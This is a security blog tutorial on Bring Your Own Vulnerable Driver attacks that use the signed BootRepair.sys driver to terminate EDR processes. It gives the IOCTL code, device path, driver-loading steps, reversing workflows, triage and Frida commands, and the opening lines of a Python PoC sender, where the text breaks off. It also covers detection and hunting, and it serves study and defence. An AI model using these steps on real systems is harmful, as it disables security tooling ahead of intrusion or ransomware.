# https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/

# Phantom in the Ring: BYOVD, IOCTL Hunting, and the Art of Killing EDRs from Kernel Space

![](https://benjitrapp.github.io/images/edr-phontom-in-the-ring.png)
Modern EDR agents run as Protected Processes backed by tamper-protection flags, kernel callbacks, and watchdog services. For years this defensive stack held firm. Then came **Bring Your Own Vulnerable Driver (BYOVD)**: load a legitimately signed driver from a hardware vendor, invoke a kernel-level process-kill primitive the EDR never expected to watch, and watch the agent terminate. No unsigned code. No DSE bypass. No alert fired.

The diagram below maps the complete attack across four sequential phases: driver triage and IOCTL discovery, kernel-mode loading, exploitation via a crafted `DeviceIoControl` call, and the detection signals each phase leaves behind. Every major section in this article corresponds to one phase in the diagram.

**Related:** [EDR Bypass Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/) · [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) · [EDR Hook Detection](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) · [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/)

BYOVD — Bring Your Own Vulnerable Driver · Full Attack FlowRing 0 Process Kill: Driver Triage → IOCTL Decode → DeviceIoControl → EDR Blind① TRIAGE② LOAD③ EXPLOIT④ DETECT① DRIVER TRIAGE & IOCTL DISCOVERYLOLDrivers / VulnDBKnown-vuln catalogueBootRepair.sys · gmer.sysSHA256 · cert · WDAC statusloldrivers.io · 2197 trackedStatic RE (IDA / Ghidra)Import scan → ntoskrnlZwTerminateProcessPsLookupProcessByIdObOpenObjectByPointerIOCTL Code RecoveryIRP\_MJ\_DEVICE\_CTRLMajorFunction\[14\]Code: 0x222014Input: 4-byte DWORD PIDDevice PathDriverEntry → IoCreateDevice\\Device\\BootRepair\\DosDevices\\BootRepairWin32: \\\.\\BootRepair② DRIVER LOADING — BYOVD (signed, DSE compliant, Ring 0)✔ Legitimately SignedBootRepair.sys — LENOVO certSymantec SHA256 CA · 0/71 VTDSE bypass NOT requiredHVCI verdict: model-dependentService Registrationsc.exe create svc type=kernelsc.exe start svcRequires: AdministratorNo Dev Mode / Test Sign needed⚠ Executes at Ring 0 — Kernel ModeNo DACL — any user can open device handleIRP\_MJ\_CREATE: no access check enforcedIRP\_MJ\_DEVICE\_CONTROL: no caller validationLowPriv user → effective Ring 0 primitive via Admin③ EXPLOITATION — DeviceIoControl → Kernel Call Chain → PPL BypassUser-Mode AppCreateFile("\\\.\\BootRepair")→ hDeviceDeviceIoControl( hDevice, 0x222014, &pid, 4, NULL, 0)IRPKernel DispatchMajorFunction\[14\] invokedPsLookupProcessByProcessId→ PEPROCESS \*ObOpenObjectByPointer→ hProcess (full access)ZwTerminateProcessNo access-level checkNo PPL protection checkBypasses tamper-protection→ EDR/AV process KILLEDWorks on PPL processesIMPACTEDR blind 🦝AV killedPPL bypassPayloaddeploy④ DETECTION & HUNTING SIGNALSSysmon / ETWEvent ID 6: Driver loadedHash → LOLDrivers lookupsc.exe type=kernel (EID 7045)Process Termination AnomaliesEDR process missing (no crash)CreateFile → \\\.\\BootRepairDeviceIoControl to unknown deviceMITRE ATT&CKT1068 · T1562.001 · T1014T1543.003 · T1553.002DrvEye --loldrivers --live-checkbenjitrapp.github.io · BYOVD Deep Dive · Purple Team Edition 🦝

### BYOVD Attack Flow: Diagram Walkthrough

The four phase bands in the diagram read left-to-right within each band, connected by dashed arrows flowing downward to the next phase. Together they form a single unbroken chain from driver discovery to EDR termination.

**Phase 1: Driver Triage and IOCTL Discovery**

Three parallel workstreams identify a viable weapon. A catalogue check against [LOLDrivers](https://www.loldrivers.io/) filters a multiple thousands of entries pool for known-vulnerable drivers and returns SHA-256, certificate chain, and WDAC block-list status upfront. Static reverse engineering in IDA or Ghidra targets the import table: the combined presence of `ZwTerminateProcess`, `PsLookupProcessByProcessId`, and `ObOpenObjectByPointer` signals a workable process-kill chain. The `IRP_MJ_DEVICE_CONTROL` handler stored at `MajorFunction[14]` is then inspected for the IOCTL constant. For `BootRepair.sys` that constant is `0x222014`, with a 4-byte DWORD PID as the sole input. The device path (`\Device\BootRepair`, Win32 alias `\\.\BootRepair`) is recovered from `DriverEntry` string references.

**Phase 2: Kernel-Mode Loading**

The selected driver is dropped to a writable path and registered as a kernel service with two `sc.exe` commands. No Developer Mode, no Test Signing mode, no custom bootloader. The driver carries a valid code-signing certificate (LENOVO, issued via Symantec) that satisfies Driver Signature Enforcement. It loads with 0/71 VirusTotal detections at discovery time.

The critical structural flaw surfaces at load time: `IoCreateDevice` was called with a `NULL` SecurityDescriptor. No DACL was attached to the device object. `IRP_MJ_CREATE` enforces no access check and `IRP_MJ_DEVICE_CONTROL` performs no caller validation. Any administrative-level process can open a handle and send IOCTLs without restriction.

**Phase 3: Exploitation and EDR Termination**

A single `DeviceIoControl` call carrying the target PID travels from user-mode into the kernel as an IRP (I/O Request Packet). The dispatch chain executes five steps:

1. The I/O manager routes the IRP to `MajorFunction[14]`, the device-control handler.
2. The handler matches control code `0x222014` and reads the PID from `AssociatedIrp.SystemBuffer`.
3. `PsLookupProcessByProcessId` resolves the integer PID to a kernel `EPROCESS` pointer.
4. `ObOpenObjectByPointer` constructs a full-access kernel handle to the target. This call runs at Ring 0, where the PPL access restriction enforced by user-mode `OpenProcess` does not exist.
5. `ZwTerminateProcess` terminates the process. The EDR agent exits. Tamper-protection flags, watchdog services, and kernel callback registrations are now irrelevant: the process hosting them is gone.

**Phase 4: Detection and Hunting Signals**

Three durable forensic signals fire before the EDR is terminated and represent the blue team’s only reliable window:

- **Sysmon Event ID 6** fires at driver load time and captures the SHA-256 hash. Matching this hash against the LOLDrivers feed at ingest is the highest-fidelity detection in the chain.
- **Windows Event 7045** records the `sc.exe` kernel service creation with `ServiceType=1`.
- A `CreateFile` call to `\\.\BootRepair` followed by `DeviceIoControl` from a non-hardware-management process is anomalous by definition.

The operational constraint: all three signals fire before EDR termination, but only if the SIEM pipeline ingests them in near-real-time. A 5-minute ingest delay means the EID 6 alert arrives after the EDR is already dead.

* * *

- [Why BYOVD Still Works](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#why-byovd-still-works)
- [The Threat Landscape: Known-Vulnerable Drivers in the Wild](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-threat-landscape)
- [Phase 1: Driver Triage](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#phase-1-driver-triage)
  - [Static Import Scanning](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#static-import-scanning)
  - [DrvEye: Automated Driver Triage at Scale](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#drveye-automated-driver-triage-at-scale)
- [Phase 2: IOCTL Anatomy](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#phase-2-ioctl-anatomy)
  - [The CTL\_CODE Macro](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-ctl_code-macro)
  - [Reversing IOCTLs in IDA Pro](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#reversing-ioctls-in-ida-pro)
  - [Reversing IOCTLs in Ghidra](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#reversing-ioctls-in-ghidra)
  - [Device Path Recovery](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#device-path-recovery)
  - [Dynamic Analysis: Intercepting IOCTLs with Frida](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#dynamic-analysis-intercepting-ioctls-with-frida)
  - [Sending IOCTLs from Python](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#sending-ioctls-from-python)
- [Phase 3: Exploitation](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#phase-3-exploitation)
  - [Case Study: PhantomKiller](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#case-study-phantomkiller)
  - [The Full Kernel Call Chain](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-full-kernel-call-chain)
  - [NimBlackout: A Nim Adaptation of the Same Primitive](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#nimblackout)
- [MITRE ATT&CK Mapping](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#mitre-attck-mapping)
- [Detection Engineering and Hunting Playbook](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#detection-engineering-and-hunting-playbook)
  - [Signal 1: Driver Load Events](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-1-driver-load-events)
  - [Signal 2: Service Creation of Kernel Drivers](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-2-service-creation-of-kernel-drivers)
  - [Signal 3: DeviceIoControl to Unknown Devices](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-3-deviceiocontrol-to-unknown-devices)
  - [Signal 4: Protected Process Termination Anomalies](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-4-protected-process-termination-anomalies)
  - [Signal 5: LOLDrivers Hash Matching at Ingest](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#signal-5-loldrivers-hash-matching-at-ingest)
  - [Splunk Detection Rules](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#splunk-detection-rules)
- [Defensive Architecture: HVCI Deep Dive](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#defensive-architecture-hvci-deep-dive)
  - [What HVCI Actually Enforces](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#what-hvci-actually-enforces)
  - [The HVCI Block List Gap: Where BYOVD Still Lives](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-hvci-block-list-gap-where-byovd-still-lives)
  - [Hunting for a Working BYOVD Candidate](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#hunting-for-a-working-byovd-candidate)
  - [BYOVD Watchdog: Live HVCI Gap Intelligence](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#byovd-watchdog-live-hvci-gap-intelligence)
  - [HVCI Extraction from a Target Environment](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#hvci-extraction-from-a-target-environment-red-team-context)
  - [Scoring a Candidate: The Five-Point Checklist](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#scoring-a-candidate-the-five-point-checklist)
  - [WDAC and LOLDrivers-Based Prevention](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#wdac-and-loldrivers-based-prevention)
- [DSE: The Gatekeeper and Its Bypass](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#dse-the-gatekeeper-and-its-bypass)
  - [DSE Internals: g\_cioptions and CI.dll](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#dse-internals-g_cioptions-and-cidll)
  - [The Dsebler Technique: KsecDD.sys as a Write Gadget](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#the-dsebler-technique-ksecddyss-as-a-write-gadget)
  - [BYOVD vs. DSE Bypass: Two Paths to Ring 0](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#byovd-vs-dse-bypass-two-paths-to-ring-0)
- [BYOVD in Ransomware Operations](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#byovd-in-ransomware-operations)
- [References and Open-Source Research](https://benjitrapp.github.io/attacks/2026-06-24-byovd-ioctl-edr-killer/#references-and-open-source-research)

* * *

## Why BYOVD Still Works

The constraint Windows imposes on kernel-mode code is binary: a driver must be signed by a certificate chaining to a trusted root before DSE allows it to load. This was a meaningful control when kernel-mode exploits required fresh unsigned code. BYOVD sidesteps the constraint entirely; it does not exploit DSE, it complies with it.

The attack model is straightforward:

1. Find a driver that is legitimately signed by a reputable vendor.
2. Identify that the driver exposes a dangerous kernel-level primitive (process termination, arbitrary read/write, physical memory access) with no caller validation.
3. Load the driver on the target system (requires administrative privileges, but not Developer Mode or Test Mode).
4. Invoke the primitive via a crafted `DeviceIoControl` call.

The result: after passing the admin boundary, an attacker can terminate PPL-protected processes (including EDR agents with tamper-protection) without ever loading a single unsigned byte of code.

Three factors keep BYOVD alive as an operational technique:

**The long tail of signed drivers.** Hardware vendors compiled and signed millions of drivers over decades. Many were written before the security community understood how dangerous unrestricted kernel primitives exposed to user-mode were. Once signed, those drivers persist indefinitely in vendor update packages, recovery tools, and pre-installed software suites.

**Revocation lag.** Certificate revocation and WDAC block-list updates are reactive, not proactive. A driver discovered by a researcher today may remain loadable on unpatched systems for months or years.

**HVCI is not universal.** Hypervisor-Protected Code Integrity (HVCI / Memory Integrity) renders most BYOVD drivers unloadable, but it requires compatible hardware and is not enabled by default on all Windows configurations. Enterprise adoption remains incomplete. Even with HVCI enabled, 479 known-vulnerable drivers still load as of mid-2026.

* * *

## The Threat Landscape: Known-Vulnerable Drivers in the Wild

BYOVD is no longer a theoretical technique. Ransomware operators and nation-state actors have integrated it into mainstream kill chains:

| Threat Actor / Malware | Vulnerable Driver Used | Technique | Source |
| --- | --- | --- | --- |
| BlackCat / ALPHV | [`ktgn.sys`](https://www.loldrivers.io/) (anti-cheat driver) | EDR termination before encryption | [Trend Micro (2023)](https://www.trendmicro.com/en_us/research/23/h/blackcat-ransomware-deploys-new-signed-kernel-driver.html) |
| [Lazarus Group](https://attack.mitre.org/groups/G0032/) | [`dell_bios.sys`](https://www.loldrivers.io/) (Dell BIOS update) | Arbitrary kernel write → DSE disable | [ESET (2022)](https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/) |
| RobbinHood ransomware | [`gdrv.sys`](https://www.loldrivers.io/) (Gigabyte utility) | EDR termination → unrestricted deployment | [Sophos (2019)](https://news.sophos.com/en-us/2019/04/09/robinhood-ransomware-takes-a-different-approach/) |
| [Scattered Spider](https://attack.mitre.org/groups/G1015/) | [`truesight.sys`](https://www.loldrivers.io/) (RealTek) | AV kill before SIM-swap pivot | [CrowdStrike (2023)](https://www.crowdstrike.com/blog/scattered-spider-attempts-to-avoid-detection-with-bring-your-own-vulnerable-driver-tactic/) |
| Cuba ransomware | [`ApcHelper.sys`](https://www.loldrivers.io/) (leaked MSI driver) | Callback removal → payload delivery | [Kaspersky (2022)](https://securelist.com/cuba-ransomware/110533/) |
| [PhantomKiller (PoC 2026)](https://github.com/redteamfortress/PhantomKiller) | [`BootRepair.sys`](https://www.loldrivers.io/) (Lenovo PC Manager) | Zero-DACL device → PID-targeted kill | [GitHub PoC](https://github.com/redteamfortress/PhantomKiller) |

The pattern is consistent: Phase 4 (Defense Evasion) of the ransomware kill chain maps directly to BYOVD. An operator who can terminate the EDR agent before deploying the encryption payload gains minutes of unobserved execution time, typically all that is needed.

* * *

## Phase 1: Driver Triage

Before a driver can be weaponised, it must be identified. The triage question is: does this driver expose a user-reachable kernel primitive with insufficient caller validation?

### Static Import Scanning

The fastest first-pass filter is the driver’s import table. A driver that imports `ZwTerminateProcess`, `MmMapIoSpace`, `ZwWriteVirtualMemory`, or similar functions is a candidate for closer examination. These are the kernel functions that give BYOVD its power, and their presence in a signed driver is a red flag.

| Import | Exploit primitive |
| --- | --- |
| `ZwTerminateProcess` | Kill any process including PPL |
| `MmMapIoSpace` | Map physical memory → arbitrary kernel R/W |
| `ZwWriteVirtualMemory` | Cross-process memory write |
| `PsLookupProcessByProcessId` | Resolve EPROCESS from PID (prerequisite for above) |
| `ObOpenObjectByPointer` | Obtain handle from kernel object pointer |
| `ZwSetSystemInformation` | Driver blacklist / callback manipulation |
| `MmCopyMemory` | Arbitrary physical read |

### DrvEye: Automated Driver Triage at Scale

Manual analysis does not scale. [DrvEye](https://github.com/0xDbgMan/DrvEye) by 0xDbgMan automates the entire triage pipeline:

```
pip install pefile capstone cryptography unicorn yara-python

python3 DrvEye.py BootRepair.sys \
    --live-check \
    --loldrivers \
    --json report.json \
    --ida BootRepair_annotations.py \
    --save-pocs \
    --verbose
```

Copy


DrvEye’s load verdict matrix:

```
─── LOAD VERDICT ───
  Default Win10/11         : WILL LOAD
  Secure Boot + DSE        : WILL LOAD
  HVCI / Memory Integrity  : WILL NOT LOAD
      • FORCE_INTEGRITY flag not set
      • W+X section present
  Test-signing mode        : WILL LOAD
  S Mode                   : WILL NOT LOAD
```

Copy


DrvEye’s IOCTL surface output:

```
[*] Detected IOCTL codes:
    0x222014  @0x14000198C  (BUFFERED, FILE_ANY_ACCESS)
              → process-kill
              [!!PPL BYPASS] [UNGATED-sink]
              bugs=process-kill,missing-probe
```

Copy


With `--save-pocs`, DrvEye emits a compilable C `DeviceIoControl` skeleton per IOCTL. With `--loldrivers`, it pulls current feeds from LOLDrivers, MalwareBazaar, and Hybrid Analysis. With `--ida`, it generates an IDA Python annotation script you can execute directly in the disassembler.

* * *

## Phase 2: IOCTL Anatomy

When a Windows driver calls `IoCreateDevice` during `DriverEntry`, it exposes a named device object that user-mode processes can open with `CreateFile("\\.\DeviceName")`. Any caller holding a valid handle can then send commands by calling `DeviceIoControl`, passing a 32-bit control code called an **IOCTL** together with optional input and output buffers. The kernel wraps this call into an **IRP** (I/O Request Packet) and routes it to the driver’s `IRP_MJ_DEVICE_CONTROL` handler, registered at `MajorFunction[14]` in the driver object.

Every IOCTL packs four fields into a single 32-bit integer: the device type, a caller access level, a vendor-assigned function number, and a buffer transfer method. The access field is the security gate: `FILE_ANY_ACCESS` (value `0`) disables that gate entirely, meaning the kernel performs no privilege check before dispatching the request. This single missing check is the architectural flaw that makes `BootRepair.sys` exploitable from any administrative process.

IOCTL Code Anatomy — CTL\_CODE Macro Decoded32-bit control code passed to DeviceIoControl() — example: 0x222014 (BootRepair.sys)DeviceTypebits 31:16 — 16 bits — 0x0022 = FILE\_DEVICE\_UNKNOWNAccess15:14 · 0x0Custbit 13Function Codebits 12:2 — 11 bits — 0x805 (vendor-defined)Method1:0 · 0x0311615141312210CTL\_CODE Macro (WDK — wdm.h)#define CTL\_CODE(DevType, Func, Method, Access) \ ((DevType) << 16) \| ((Access) << 14) \| \ ((Func) << 2) \| (Method)// BootRepair.sys: CTL\_CODE(0x22, 0x805, 0, 0) = 0x222014Transfer Method (bits 1:0)0 = METHOD\_BUFFERED I/O system copies via buffer1 = METHOD\_IN\_DIRECT MDL for input2 = METHOD\_OUT\_DIRECT MDL for output3 = METHOD\_NEITHER raw user pointers (dangerous)Access Field (bits 15:14) — Gating Check0x0 = FILE\_ANY\_ACCESS ← BootRepair.sys — UNGATED0x1 = FILE\_READ\_ACCESS caller needs read access0x2 = FILE\_WRITE\_ACCESS caller needs write accessFILE\_ANY\_ACCESS = no handle privilege check enforced0x222014 DecodedBinary: 0010 0010 0010 0000 0001 0000 0001 0100DevType: 0x0022 Access: 0x0 Func: 0x805 Mth: 0x0Input buffer: 4 bytes — DWORD PID of target processNo DACL · FILE\_ANY\_ACCESS · METHOD\_BUFFEREDbenjitrapp.github.io · IOCTL Anatomy · T1068 / T1562.001 🦝

### The CTL\_CODE Macro

```
// Windows Driver Kit — wdm.h
#define CTL_CODE(DeviceType, Function, Method, Access) \
    (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
```

Copy


| Field | Bits | Description |
| --- | --- | --- |
| `DeviceType` | 31:16 | `0x22` = `FILE_DEVICE_UNKNOWN`, common in exploitable drivers |
| `Access` | 15:14 | `0x0` = `FILE_ANY_ACCESS`. No access check enforced. This is the key gating failure. |
| `Function` | 12:2 | Vendor-assigned. Values `0x800+` are vendor-defined, not Microsoft-reserved |
| `Method` | 1:0 | `0` = `METHOD_BUFFERED`; kernel copies PID via I/O system buffer |

The Python utility below decodes any 32-bit control code into its four constituent fields and flags whether the function number is vendor-defined. Paste it into a REPL while triaging a candidate driver.

●●●ioctl\_decoder.py — Python 3.x

\# CTL\_CODE field lookup tables

METHOD = \["BUFFERED", "IN\_DIRECT", "OUT\_DIRECT", "NEITHER"\]

ACCESS = \["FILE\_ANY\_ACCESS", "FILE\_READ\_ACCESS", "FILE\_WRITE\_ACCESS", "READ+WRITE"\]

def decode\_ioctl(code: int) -> dict:

return {

"device\_type": hex((code >\> 16) & 0xFFFF),

"access": ACCESS\[(code >\> 14) & 0x3\],

"function": hex((code >\> 2) & 0xFFF),

"method": f"METHOD\_{METHOD\[code & 0x3\]}",

"vendor": (code >\> 2) & 0xFFF >= 0x800,

}

>>\> decode\_ioctl(0x222014)

{

'device\_type': '0x22', # FILE\_DEVICE\_UNKNOWN

'access': 'FILE\_ANY\_ACCESS', # no caller check enforced

'function': '0x805', # vendor-defined (>= 0x800)

'method': 'METHOD\_BUFFERED',

'vendor': True

}

* * *

### Reversing IOCTLs in IDA Pro

IDA Pro 9.0 — BootRepair.sys \[AMD64\]File Edit Jump Search View Debugger Options Windows HelpIDA View-AImportsStringsFunctionsSTEP 1 — importsSTEP 2 — xrefsSTEP 3 — dispatchSTEP 4 — DriverEntry; ── Imports (ntoskrnl.exe) ── press X on function to xref ──────────────────.idata:FFFFF80000012010 ZwTerminateProcess ; ← START HERE.idata:FFFFF80000012018 PsLookupProcessByProcessId.idata:FFFFF80000012020 ObOpenObjectByPointer.idata:FFFFF80000012028 IoCreateDevice; Press \[X\] on ZwTerminateProcess → shows 1 call site → sub\_14000198C; ── sub\_14000198C — termination routine (xref target) ─────────────────────sub\_14000198C proc near mov rcx, \[rsp+8\] ; PID from SystemBuffer call PsLookupProcessByProcessId ; → PEPROCESS\* call ObOpenObjectByPointer  ; → hProcess call ZwTerminateProcess  ; No PPL check!; Press \[X\] on sub\_14000198C → caller is IRP\_MJ\_DEVICE\_CONTROL handler; ── IRP\_MJ\_DEVICE\_CONTROL handler — MajorFunction\[14\] ─────────────────────IrpDispatch proc near mov eax, \[rdi+70h\] ; Parameters.DeviceIoControl.IoControlCode cmp eax, 222014h ; ← IOCTL CODE HERE ✓ jnz loc\_unsupported mov rcx, \[rdi+20h\] ; AssociatedIrp.SystemBuffer → PID ptr; Input: \[rdi+38h\] = InputBufferLength (must be ≥ 4) No access check before call.; ── DriverEntry — device name & symbolic link ─────────────────────────────DriverEntry proc near lea rcx, aDeviceBootrep ; L"\\Device\\BootRepair" call IoCreateDevice ; NULL SecurityDescriptor → no DACL lea rcx, aDosdevicesBoot ; L"\\DosDevices\\BootRepair" call IoCreateSymbolicLink ; Win32: \\\.\\BootRepair ✓; \[X\] on DriverEntry → confirms SecurityDescriptor = NULL in IoCreateDevice callIDA — RE Workflow① Imports paneOpen View → Open Subviews→ Imports. Filter for:ZwTerminateProcessMmMapIoSpaceZwWriteVirtualMemory② Cross-reference \[X\]Press X on import →find the calling function.Rename: F IDA shortcut.Press X again on callerto reach IRP handler.③ IOCTL dispatchLook for cmp eax, 0x???constants after loadingIoStackLocation. Theseare your IOCTL codes.Check +38h offset forInputBufferLength guard.④ DriverEntry stringsView → Strings. Look for\\Device\\\*\\DosDevices\\\*xref → IoCreateDevice:NULL SD = no DACL ✓

The IDA cross-reference chain in five steps:

**Step 1: Imports.**`View → Open Subviews → Imports`. Filter for `ntoskrnl.exe` exports. Flag `ZwTerminateProcess`, `MmMapIoSpace`, `PsLookupProcessByProcessId`, `ObOpenObjectByPointer`.

**Step 2: Press `X`.** On the dangerous import, press `X` to list all call sites. The calling function (e.g. `sub_14000198C`) is your termination routine. Rename it `byovd_terminate_process` for clarity.

**Step 3: Follow xrefs up.** Press `X` on your renamed termination function. The caller is the `IRP_MJ_DEVICE_CONTROL` handler. Look for a `cmp eax, 0x???` constant: that is the IOCTL code. Inspect `[rdi+38h]` (InputBufferLength) for size checks and `[rdi+20h]` (SystemBuffer) for the input pointer.

**Step 4: DriverEntry strings.**`View → Open Subviews → Strings`. Filter for `\Device\` and `\DosDevices\`. Cross-reference these strings to `DriverEntry`, find the `IoCreateDevice` call. If the SecurityDescriptor argument is `NULL`, there is no DACL; any caller can open the device.

**Step 5: Confirm device path.** The DosDevices symlink maps directly to the Win32 `\\.\` path you pass to `CreateFile`.

* * *

### Reversing IOCTLs in Ghidra

Ghidra 11.3 — CodeBrowser: BootRepair.sysFile Edit Analysis Graph Navigation Search Select Tools Window HelpSymbol Tree▼ FunctionsDriverEntryIrpDeviceControl terminate\_procIrpCreateIrpCloseDefined Stringsu"\\Device\\BootRepair"u"\\DosDevices\\BootRep"ImportsZwTerminateProcessPsLookupProc…ObOpenObjectBy…IoCreateDeviceIoCreateSymbolicLinkDecompilerDisassemblyBytes/\\* IRP\_MJ\_DEVICE\_CONTROL handler — auto-decompiled \*/NTSTATUS IrpDeviceControl(PDEVICE\_OBJECT dev, PIRP irp){ PIO\_STACK\_LOCATION stack = IoGetCurrentIrpStackLocation(irp); ULONG code = stack->Parameters.DeviceIoControl.IoControlCode; if (code == 0x222014) { /\\* ← IOCTL found \*/ DWORD pid = \*(DWORD\*)irp->AssociatedIrp.SystemBuffer;terminate\_proc(pid); /\\* no size check before call \*/ } return STATUS\_SUCCESS;}/\\* Right-click 0x222014 → References → Find References → xref to callers \*//\\* terminate\_proc — renamed from FUN\_14000198c via right-click → Rename Function \*/NTSTATUS terminate\_proc(DWORD pid){ PEPROCESS \*proc; HANDLE hProc; PsLookupProcessByProcessId((HANDLE)pid, &proc); ObOpenObjectByPointer(proc, 0, NULL, 0x1FFFFF, \*PsProcessType, 0, &hProc);ZwTerminateProcess(hProc, 0); /\\* PPL irrelevant at Ring 0 \*/}/\\* DriverEntry — device creation and symlink \*/NTSTATUS DriverEntry(PDRIVER\_OBJECT drv, PUNICODE\_STRING reg){ IoCreateDevice(drv, 0, &devName, FILE\_DEVICE\_UNKNOWN, 0, FALSE, NULL, &devObj); /\\* NULL SecurityDesc → no DACL 🚨 \*/ IoCreateSymbolicLink(&symLink, &devName); /\\* \\DosDevices\\BootRepair \*/ return STATUS\_SUCCESS;}Ghidra Workflow① Symbol TreeExpand Imports →right-click import→ References →Show References② Rename (L)Press L on functionto rename. UseCtrl+L for vars.③ IOCTL constantSearch → ForScalars. Enter0x222014or use script:find\_ioctls.py④ DecompilerWindow →Decompiler. ShowsC pseudo-code.NULL in 5th argto IoCreateDevice= no DACL.Script tipAnalysis → RunScript → importDrvEye --ghidrafor auto-labels& IOCTL decode

Ghidra’s free, open-source nature makes it the go-to for driver RE in resource-constrained environments. The workflow mirrors IDA’s but with different mechanics:

**Step 1: Symbol Tree → Imports.** Expand `Imports` in the Symbol Tree panel. Right-click `ZwTerminateProcess` → `References → Show References to ZwTerminateProcess`. The reference panel lists every call site.

**Step 2: Decompiler + Rename.** Double-click a reference to jump to the caller. The Decompiler pane (Window → Decompiler) renders C pseudo-code automatically, far faster to read than raw disassembly. Press `L` to rename the function (e.g. `terminate_proc`). Press `Ctrl+L` to rename local variables.

**Step 3: Find the IOCTL constant.**`Search → For Scalars`. Enter `0x222014`. Ghidra highlights all occurrences across the entire binary. Alternatively, use Ghidra’s `find_ioctls.py` community script (from the Ghidra Script Manager) which automatically walks dispatch tables and emits a decoded IOCTL list.

**Step 4: DriverEntry NULL SecurityDescriptor.** Follow the string `\Device\BootRepair` (Defined Strings panel) to its xref in `DriverEntry`. The Decompiler renders the `IoCreateDevice` call clearly. The fifth argument (SecurityDescriptor) being `NULL` is immediately visible in the pseudo-code; no assembly reading required.

**Key Ghidra advantage over IDA for this workflow:** the decompiler produces readable C that makes the `NULL SecurityDescriptor` and missing `InputBufferLength` guard checks visible at a glance, without needing to trace register values through multiple basic blocks.

### Device Path Recovery

For hardened drivers that construct device names at runtime (string concatenation, XOR decoding, format strings), static analysis fails in both tools. DrvEye handles this via a Unicorn-emulated `DriverEntry` sandbox that executes the initialisation code and captures the resulting device name, without loading unsigned code on a real system.

### Dynamic Analysis: Intercepting IOCTLs with Frida

When a driver computes IOCTL codes at runtime, or when static analysis reveals multiple candidate constants and you need to confirm which one fires under real conditions, dynamic interception is faster than a debugger. The Frida hook below attaches to any user-mode process and logs every `DeviceIoControl` call with its code and input buffer before the IRP crosses the Ring 3 boundary.

●●●frida\_ioctl\_hook.js — Frida 16.x

// Hook DeviceIoControl — log every IOCTL code and input buffer

const DeviceIoControl = Module.findExportByName("kernel32.dll", "DeviceIoControl");

Interceptor.attach(DeviceIoControl, {

onEnter(args) {

const code = args\[1\].toInt32();

const inSize = args\[3\].toInt32();

const inBuf = args\[2\];

console.log(

"\[IOCTL\]",

"code=0x" \+ code.toString(16).padStart(8, "0"),

"inSize=" \+ inSize

);

if (inSize === 4)

console.log(" pid =", inBuf.readU32());

}

});

// frida -p <PID> -l frida\_ioctl\_hook.js

// frida -n MsMpEng.exe -l frida\_ioctl\_hook.js ← hook AV vendor binary directly

Attach to `MsMpEng.exe` or any other vendor binary to observe every IOCTL its user-mode component sends to its own driver. The `inSize === 4` branch auto-decodes the PID from a `METHOD_BUFFERED` 4-byte input, confirming both the control code and the exact input format without touching the driver binary.

### Sending IOCTLs from Python

Once the device path, IOCTL code, and input buffer layout are confirmed, `ctypes` provides everything needed to build a working PoC without compiling a C project. Two primitives are sufficient: `CreateFileW` to obtain a device handle, and `DeviceIoControl` to dispatch the IRP.

●●●byovd\_sender.py — Python 3.x · requires Administrator

import ctypes, ctypes.wintypes as wt, struct

kernel32 = ctypes.windll.kernel32

GENERIC\_RW = 0x80000000 \| 0x40000000
